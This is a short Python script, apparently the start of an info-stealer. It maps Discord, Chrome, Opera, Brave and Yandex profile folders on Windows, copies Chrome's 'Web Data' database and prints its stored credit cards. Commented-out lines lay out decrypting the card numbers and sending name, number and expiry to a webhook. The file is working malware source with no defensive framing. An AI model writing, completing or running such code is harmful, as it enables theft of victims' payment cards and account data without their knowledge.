import os 
import shutil
import sqlite3
from pprint import pprint

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': roaming + r'\Discord',
    'Discord Canary': roaming + r'\discordcanary',
    'Discord PTB': roaming + r'\discordptb',
    'Google Chrome': local + r'\Google\Chrome\User Data\Default',
    'Opera': roaming + r'\Opera Software\Opera Stable',
    'Brave': local + r'\BraveSoftware\Brave-Browser\User Data\Default',
    'Yandex': local + r'\Yandex\YandexBrowser\User Data\Default'
}

pprint(paths)


login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Web Data'
print(f'{login_db =}')
shutil.copy2(login_db,"CCvault.db")
conn = sqlite3.connect("CCvault.db")
cursor = conn.cursor()

cursor.execute("SELECT * FROM credit_cards")
for r in cursor.fetchall():
    print(r)
    # username = r[1]
    # encrypted_password = r[4]
    # decrypted_password = dpw(encrypted_password, master_key)
    # expire_mon = r[2]
    # expire_year = r[3]
    # hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " + str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
    